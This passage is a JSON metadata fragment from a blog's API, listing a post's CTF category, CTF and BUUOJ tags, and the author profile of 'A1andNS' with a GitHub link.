mins."},"categories":[{"name":"CTF","slug":"CTF","count":44,"path":"api/categories/CTF.json"}],"tags":[{"name":"CTF","slug":"CTF","count":16,"path":"api/tags/CTF.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"author":{"name":"A1andNS","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}